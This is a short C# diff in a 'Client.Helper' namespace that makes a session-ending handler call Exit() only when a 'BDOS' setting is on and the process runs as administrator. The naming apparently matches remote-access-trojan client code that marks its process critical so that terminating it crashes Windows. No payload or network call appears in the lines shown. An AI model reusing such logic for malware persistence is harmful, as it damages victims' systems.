@@ -11,7 +11,8 @@ namespace Client.Helper
 
         public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
         {
-            Exit();
+            if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
+                Exit();
         }
         public static void Set()
         {
